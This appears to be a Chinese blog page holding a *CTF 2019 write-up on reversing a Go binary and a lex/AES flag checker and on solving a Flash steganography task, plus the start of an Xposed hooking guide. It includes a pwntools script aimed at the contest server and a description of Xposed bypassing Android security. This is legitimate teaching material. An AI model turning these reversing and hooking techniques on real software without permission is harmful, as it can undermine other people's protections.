<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.1.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">


  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.1.2',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta property="og:type" content="website">
<meta property="og:title" content="idongxia">
<meta property="og:url" content="https://idongxia.github.io/index.html">
<meta property="og:site_name" content="idongxia">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="idongxia">





  
  
  <link rel="canonical" href="https://idongxia.github.io/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>idongxia</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">idongxia</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2019/05/30/xinCTFwriteup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/05/30/xinCTFwriteup/" class="post-title-link" itemprop="url">xinCTFwriteup</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-05-30 12:00:00" itemprop="dateCreated datePublished" datetime="2019-05-30T12:00:00+08:00">2019-05-30</time>
            

            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2019/05/30/xinCTFwriteup/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/05/30/xinCTFwriteup/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="ctf-writeup"><a href="#ctf-writeup" class="headerlink" title="*ctf writeup"></a>*ctf writeup</h1><p>[TOC]</p>
<h2 id="0x01-fanoGo"><a href="#0x01-fanoGo" class="headerlink" title="0x01 fanoGo"></a>0x01 fanoGo</h2><h4 id="1-1-发现"><a href="#1-1-发现" class="headerlink" title="1.1 发现"></a>1.1 发现</h4><p>​    1、拖进ida，静态编译发现很乱，go语言编译出来的第一次看，只能自己在用go语言编译一个出来分析，来一点点对应，去除不需要分析的部分。</p>
<p>​    <img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556675832893.png" alt="1556675832893"></p>
<p>​    2、顺着看大概把流程看懂了，如下图，一开始先读取corpus.txt文件：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556675908786.png" alt="1556675908786"></p>
<p>​    然后干一些不可描述的事情，没看懂，这不重要。。</p>
<p>​    3、定位到程序输入的点：</p>
<p>​    say something!</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556675988079.png" alt="1556675988079"></p>
<p>​    这里会让我输入一串东西，我一开始也不知道是什么，继续往下看，看怎么对它进行处理。</p>
<p>​    4、经过继续静态分析和一些动态调试，大概确定输入的东西会被以下两个函数处理：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556676118479.png" alt="1556676118479"></p>
<p>​    根据符号的字面意思，应该是fano编码，继续玩下分析。</p>
<p>​    5、继续分析发现关键点，如下图：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556676234931.png" alt="1556676234931"></p>
<p>​    可以看到v30如果不为0就可以输出flag，而v30的赋值在前面的一个判断中，所以我们要确保e._type==0x15A成立，而图中”If you connot ….”这段话刚好是0x15A长度，结合前面的fano_encode于是我就猜到了大概思路。</p>
<h4 id="1-2-程序流程"><a href="#1-2-程序流程" class="headerlink" title="1.2 程序流程"></a>1.2 程序流程</h4><p>​    这里说一下大概思路，程序的流程是：</p>
<p>​    1、输入一个字符串</p>
<p>​    2、使用fano_encode处理这个字符串（上网查是香农-范洛编码）</p>
<p>​    3、将处理结果和0x15a长度的字符串作比较,一样则输出flag</p>
<p>​    所以，这里的关键是知道fano_encode是怎么做的，但是仔细去分析这个函数太麻烦了，所以就想到加密解密函数应该成对存在，在ida一搜，还真有：</p>
<p>​    <img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556676712202.png" alt="1556676712202"></p>
<p>​    所以有了具体的解题思路。</p>
<h4 id="1-3-思路"><a href="#1-3-思路" class="headerlink" title="1.3 思路"></a>1.3 思路</h4><p>​    1、作为pwn选手，首先会patch一个程序，于是把fano_encode这个函数改成了fano_decode函数，通过输入那个0x15a长度的字符串，gdb动调得到加密后的字符串，dump下来</p>
<p>​    2、写一个脚本，将加密后的字符串发送给服务器，搞定！</p>
<h4 id="1-4-代码"><a href="#1-4-代码" class="headerlink" title="1.4 代码"></a>1.4 代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#version 6 by tempo</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.clear(arch = 'amd64')</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">proc_name = <span class="string">'fanoGo.bak'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span> <span class="comment">#'/lib/x86_64-linux-gnu/libc-2.23.so'</span></span><br><span class="line">ip_addr = <span class="string">"34.92.37.22:10001"</span> <span class="comment">#/lib32/libc-2.23.so</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="comment">#-------------------no change this----------------------</span></span><br><span class="line">elf = ELF(<span class="string">'./&#123;&#125;'</span>.format(proc_name))</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> len(libc_name) ==<span class="number">0</span>:</span><br><span class="line">        r = process(<span class="string">'./&#123;&#125;'</span>.format(proc_name))</span><br><span class="line">        libc = r.libc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">'./&#123;&#125;'</span>.format(proc_name), env = &#123;<span class="string">"LD_PRELOAD"</span>: libc_name&#125;)</span><br><span class="line">        libc = ELF(libc_name)</span><br><span class="line">    <span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=remote(ip_addr.split(<span class="string">":"</span>)[<span class="number">0</span>],ip_addr.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"><span class="comment">#[0x45216,0x4526a,0xf02a4,0xf1147] 0x555555757000 0x7ffff7a0d000 0x555555554000 next search recvline interactive payload send sendline sendlineafter sendafter recvuntil recv recvall ljust format symbols success got plt p64 p32 hex</span></span><br><span class="line"><span class="comment"># #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line"><span class="comment"># obj = LibcSearcher("fgets", 0X7ff39014bd90)</span></span><br><span class="line"><span class="comment"># obj.dump("system")        #system 偏移</span></span><br><span class="line"><span class="comment">#------------------------------------------------</span></span><br><span class="line"><span class="comment"># gdb.attach(r,"b *0x4019F6")</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"1.file"</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "If you cannot read all your books...fondle them---peer into them, let them fall open where they will, read from the first sentence that arrests the eye, set them back on the shelves with your own hands, arrange them on your own plan so that you at least know where they are. Let them be your friends; let them, at any rate, be your acquaintances."</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">"Say something:"</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>脚本中有用的就后面几行，前面的是做pwn题的脚本模板，用来远程连接题目的。其中的1.file这里放个图片就好了：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556677045158.png" alt="1556677045158"></p>
<p>也就是将这个字符串发送给服务器，就得到flag.</p>
<h4 id="1-5-解题效果"><a href="#1-5-解题效果" class="headerlink" title="1.5 解题效果"></a>1.5 解题效果</h4><p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556677116411.png" alt="1556677116411"></p>
<h2 id="0x02-yy"><a href="#0x02-yy" class="headerlink" title="0x02 yy"></a>0x02 yy</h2><h4 id="2-1-发现"><a href="#2-1-发现" class="headerlink" title="2.1 发现"></a>2.1 发现</h4><p>​    1、拖进ida静态分析，结合gdb动调，读懂大概流程，读入一个字符串，并yyparse来处理：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556677293795.png" alt="1556677293795"></p>
<p>​    2、一开始不知道yy开头的函数是什么，还自己进了yy函数里面分析，简直身无可恋。后来觉得不对，将yylex放上去搜，以下就知道是lex词法分析器。orz。。。</p>
<p>​    3、发现关键点：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556677976063.png" alt="1556677976063"></p>
<p>​    如上图，找到了成功的地方，于是动调memcmp，发现是两个不知道什么的字符串再进行比较，比较长度0xa0.</p>
<p>​    4、因为题目要我们输入flag，于是我们猜测*CTF{}是他的格式，所以我们尝试：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556678123498.png" alt="1556678123498"></p>
<p>​    如图，发现猜对了，但是并不是所有这种格式的可以成功，经过动调，结合yylex内的语法规则，发现花括号内的字符包括</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz0123456789_</span><br></pre></td></tr></table></figure>

<p>​    yylex经过注释后如下图：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556678260570.png" alt="1556678260570"></p>
<p>所以猜测flag是由以上这些字符组成。</p>
<p>​    5、目前我们不知道字符串是怎么被处理的，然后再swith中发现了这个：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556678345518.png" alt="1556678345518"></p>
<p>​    然后利用ida的发现加密的插件findcrypt，找到了aes加密的s盒：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556678402953.png" alt="1556678402953"></p>
<p>​    猜测这个是aes加密，经过后续的动调发现时aes-cbc加密，程序流程分析清楚。</p>
<h4 id="2-2-程序流程"><a href="#2-2-程序流程" class="headerlink" title="2.2 程序流程"></a>2.2 程序流程</h4><p>​    概括程序流程：</p>
<p>​    1、输入一个字符串</p>
<p>​    2、经过yylex词法分析器的检测，如果不符合*CTF{xxxx}的格式会提示syntax error，其中xxxx包括小写字母和数字还有下划线</p>
<p>​    3、将输入的字符串按照下划线_进行分段，经过数值初始化append、字符替换和aes-cbc加密后，与程序中的加密字段进行比较</p>
<p>​    4、比较成功，则输入为flag.</p>
<h4 id="2-3-思路"><a href="#2-3-思路" class="headerlink" title="2.3 思路"></a>2.3 思路</h4><p>​    1、将存储在程序中最后进行对比操作的密文用aes-cbc解密，iv设为0,得到明文如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e5e5258631ab6eafb114fe76783d1eff </span><br><span class="line">11d65e864f6b675eb114fe76783d1eff </span><br><span class="line">6b4e258631ab6eafb114fe76783d1eff </span><br><span class="line">1d6f478a31ab6eafb114fe76783d1eff </span><br><span class="line">825e8a8631ab6eafb114fe76783d1eff </span><br><span class="line">5e67258631ab6eafb114fe76783d1eff </span><br><span class="line">5eeded8a31ab6eafb114fe76783d1eff </span><br><span class="line">4f37258631ab6eafb114fe76783d1eff </span><br><span class="line">47ed58ed474eedafb114fe76783d1eff</span><br></pre></td></tr></table></figure>

<p>​    2、找到字符替换表，将每个字符替换回来，字符替换表如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000002062E0 box             db 82h         a         ; DATA XREF: yyparse+575↑r</span><br><span class="line">.data:00000000002062E1 byte_2062E1     db 5           b         ; DATA XREF: yyparse+59D↑r</span><br><span class="line">.data:00000000002062E2 byte_2062E2     db 86h         c         ; DATA XREF: yyparse+5C5↑r</span><br><span class="line">.data:00000000002062E3 byte_2062E3     db 8Ah          d        ; DATA XREF: yyparse+5ED↑r</span><br><span class="line">.data:00000000002062E4 byte_2062E4     db 0Bh         e         ; DATA XREF: yyparse+615↑r</span><br><span class="line">.data:00000000002062E5 byte_2062E5     db 11h         f         ; DATA XREF: yyparse+63D↑r</span><br><span class="line">.data:00000000002062E6 byte_2062E6     db 96h        g          ; DATA XREF: yyparse+665↑r</span><br><span class="line">.data:00000000002062E7 byte_2062E7     db 1Dh         h         ; DATA XREF: yyparse+68D↑r</span><br><span class="line">.data:00000000002062E8 byte_2062E8     db 27h        i          ; DATA XREF: yyparse+6B5↑r</span><br><span class="line">.data:00000000002062E9 byte_2062E9     db 0A9h        j         ; DATA XREF: yyparse+6DD↑r</span><br><span class="line">.data:00000000002062EA byte_2062EA     db 2Bh          k        ; DATA XREF: yyparse+705↑r</span><br><span class="line">.data:00000000002062EB byte_2062EB     db 0B1h         l        ; DATA XREF: yyparse+72D↑r</span><br><span class="line">.data:00000000002062EC byte_2062EC     db 0F3h         m        ; DATA XREF: yyparse+755↑r</span><br><span class="line">.data:00000000002062ED byte_2062ED     db 5Eh          n        ; DATA XREF: yyparse+77D↑r</span><br><span class="line">.data:00000000002062EE byte_2062EE     db 37h          o        ; DATA XREF: yyparse+7A5↑r</span><br><span class="line">.data:00000000002062EF byte_2062EF     db 38h          p        ; DATA XREF: yyparse+7CD↑r</span><br><span class="line">.data:00000000002062F0 byte_2062F0     db 0C2h        q         ; DATA XREF: yyparse+7F5↑r</span><br><span class="line">.data:00000000002062F1 byte_2062F1     db 47h         r         ; DATA XREF: yyparse+81D↑r</span><br><span class="line">.data:00000000002062F2 byte_2062F2     db 4Eh          s        ; DATA XREF: yyparse+845↑r</span><br><span class="line">.data:00000000002062F3 byte_2062F3     db 4Fh          t        ; DATA XREF: yyparse+86D↑r</span><br><span class="line">.data:00000000002062F4 byte_2062F4     db 0D6h         u        ; DATA XREF: yyparse+895↑r</span><br><span class="line">.data:00000000002062F5 byte_2062F5     db 58h          v        ; DATA XREF: yyparse+8BD↑r</span><br><span class="line">.data:00000000002062F6 byte_2062F6     db 0DEh         w        ; DATA XREF: yyparse+8E5↑r</span><br><span class="line">.data:00000000002062F7                 db 0E2h         x        ; DATA XREF: yyparse+90D↑r</span><br><span class="line">.data:00000000002062F8                 db 0E5h         y        ; DATA XREF: yyparse+935↑r</span><br><span class="line">.data:00000000002062F9                 db 0E6h         z        ; DATA XREF: yyparse+95D↑r</span><br><span class="line">.data:00000000002062FA                 db  67h ; g     0        ; DATA XREF: yyparse+985↑r</span><br><span class="line">.data:00000000002062FB                 db  6Bh ; k     1        ; DATA XREF: yyparse+9AD↑r</span><br><span class="line">.data:00000000002062FC                 db 0ECh         2        ; DATA XREF: yyparse+9D5↑r</span><br><span class="line">.data:00000000002062FD                 db 0EDh         3        ; DATA XREF: yyparse+9FD↑r</span><br><span class="line">.data:00000000002062FE byte_2062FE     db 6Fh          4        ; DATA XREF: yyparse+A25↑r</span><br><span class="line">.data:00000000002062FF byte_2062FF     db 0F2h         5        ; DATA XREF: yyparse+A4D↑r</span><br><span class="line">.data:0000000000206300 byte_206300     db 73h          6        ; DATA XREF: yyparse+A75↑r</span><br><span class="line">.data:0000000000206301 byte_206301     db 0F5h         7        ; DATA XREF: yyparse+A9A↑r</span><br><span class="line">.data:0000000000206302 byte_206302     db 77h          8        ; DATA XREF: yyparse+ABF↑r</span><br><span class="line">.data:0000000000206303 byte_206303     db 7Fh          9        ; DATA XREF: yyparse+AE4↑r</span><br></pre></td></tr></table></figure>

<p>​    表示0x82其实就是字符a，解出来的密文开头是0xe5e5，表示的就是yy两个字符，再结合下划线截断，可以手工对照逐个字符翻译，就是这么蠢的做法..orz……，翻译后的表如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e5e5258631ab6eafb114fe76783d1eff yy_</span><br><span class="line">11d65e864f6b675eb114fe76783d1eff funct10n_</span><br><span class="line">6b4e258631ab6eafb114fe76783d1eff 1s_</span><br><span class="line">1d6f478a31ab6eafb114fe76783d1eff h4rd_</span><br><span class="line">825e8a8631ab6eafb114fe76783d1eff and_</span><br><span class="line">5e67258631ab6eafb114fe76783d1eff n0_</span><br><span class="line">5eeded8a31ab6eafb114fe76783d1eff n33d_</span><br><span class="line">4f37258631ab6eafb114fe76783d1eff to_</span><br><span class="line">47ed58ed474eedafb114fe76783d1eff r3v3rs3</span><br></pre></td></tr></table></figure>

<p>所以最后的flag就是结合体：*CTF{yy_funct10n_1s_h4rd_and_n0_n33d_to_r3v3rs3}</p>
<h2 id="0x03-babyflash"><a href="#0x03-babyflash" class="headerlink" title="0x03 babyflash"></a>0x03 babyflash</h2><h4 id="3-1-发现"><a href="#3-1-发现" class="headerlink" title="3.1 发现"></a>3.1 发现</h4><p>​    misc题目靠脑洞，拿到一个flash文件，用JPEXS Free Flash Decompiler工具进行资源提取，提取处441张黑白图片和一个MP3音频文件，首先就是黑白图片想到二维码，音频想到频谱分析。好其实到这里题目就做完了，开始具体分析。</p>
<h4 id="3-2-思路"><a href="#3-2-思路" class="headerlink" title="3.2 思路"></a>3.2 思路</h4><p>​    1、得到的图片如下图：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556679200000.png" alt="1556679200000"></p>
<p>​    发现441刚好是21的平方，所以笃定是二维码，写个脚本出图：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import os</span><br><span class="line">from PIL import Image</span><br><span class="line">txt=&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1000):</span><br><span class="line">	filePath = &quot;./123/images/&#123;&#125;.png&quot;.format(i)</span><br><span class="line">	if os.path.exists(filePath):</span><br><span class="line">		fsize = os.path.getsize(filePath)</span><br><span class="line">		if fsize == 112:</span><br><span class="line">			txt+=&apos;1&apos;</span><br><span class="line">		else:</span><br><span class="line">			txt+=&apos;0&apos;</span><br><span class="line"></span><br><span class="line">print len(txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im=Image.new(&apos;RGB&apos;,(21,21))</span><br><span class="line">pix = im.load()</span><br><span class="line">for x in xrange(len(txt)):</span><br><span class="line">    if txt[x] == &apos;1&apos;:</span><br><span class="line">        pix[x/21,x%21]=(0,0,0)</span><br><span class="line">    else:</span><br><span class="line">        pix[x/21,x%21]=(255,255,255)</span><br><span class="line">im.show()</span><br><span class="line">im.save(&apos;1.png&apos;)</span><br></pre></td></tr></table></figure>

<p>​    得到的二维码如下：</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556679301931.png" alt="1556679301931"></p>
<p>​    放大后进行识别，得到一半flag:</p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556679327211.png" alt="1556679327211"></p>
<p>​    2、MP3音频放到audacity程序中进行常规频谱分析，得到另一半flag  “&amp;_the_rest}” </p>
<p><img src="//idongxia.github.io/2019/05/30/xinCTFwriteup/1556679625163.png" alt="1556679625163"></p>
<p>结合后得到整个flag</p>
<p>*ctf{half_flag_&amp;&amp;_the_rest}</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/12/03/Xposed/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/12/03/Xposed/" class="post-title-link" itemprop="url">Use Xposed To Hook</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2018-12-03 12:00:00" itemprop="dateCreated datePublished" datetime="2018-12-03T12:00:00+08:00">2018-12-03</time>
            

            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2018/12/03/Xposed/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/12/03/Xposed/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><h1 id="Xposed-简介"><a href="#Xposed-简介" class="headerlink" title="Xposed 简介"></a>Xposed 简介</h1><h2 id="Xposed做法："><a href="#Xposed做法：" class="headerlink" title="Xposed做法："></a><strong>Xposed做法：</strong></h2><p>Xposed是通过hook方法的方式来实现，由于Xposed修改了系统在启动时加载的Zygote进程相关的逻辑以及加载的资源(并且所有应用的启动都是从Zygote进程中拷贝出来的)，因此几乎可以架空一切安全，做所有事情，包括修改系统行为。</p>
<h2 id="hook的大概原理："><a href="#hook的大概原理：" class="headerlink" title="hook的大概原理："></a><strong>hook的大概原理：</strong></h2><p>hook方法是 XposedBridge 中的一个私有native方法 hookMethodNative  改变被hook方法的类型为native并且link方法实现到它自己的native方法中，并且对调用者透明，该native方法调用XposedBridge中的  handleHookedMethod 方法，将参数， this 引用等传进来，之后在回调回去，这样我们就可以在方法执行前后做任何的事情了。</p>
<h1 id="Xposed-组件"><a href="#Xposed-组件" class="headerlink" title="Xposed 组件"></a>Xposed 组件</h1><h2 id="Xposed包含如下几个工程："><a href="#Xposed包含如下几个工程：" class="headerlink" title="Xposed包含如下几个工程："></a>Xposed包含如下几个工程：</h2><ol>
<li><strong>XposedInstaller</strong>，这是Xposed的插件管理和功能控制APP，也就是说Xposed整体管控功能就是由这个APP来完成的，它包括启用Xposed插件功能，下载和启用指定插件APP，还可以禁用Xposed插件功能等。注意，这个app要正常无误得运行必须能拿到root权限。</li>
<li><strong>Xposed</strong>，这个项目属于Xposed框架，其实它就是单独搞了一套xposed版的zygote。这个zygote会替换系统原生的zygote。所以，它需要由XposedInstaller在root之后放到/system/bin下。</li>
<li><strong>XposedBridge</strong>，这个项目也是Xposed框架，它属于Xposed框架的Java部分，编译出来是一个XposedBridge.jar包。</li>
<li><strong>XposedTools</strong>，Xposed和XposedBridge编译依赖于Android源码，而且还有一些定制化的东西。所以XposedTools就是用来帮助我们编译Xposed和XposedBridge的。</li>
</ol>
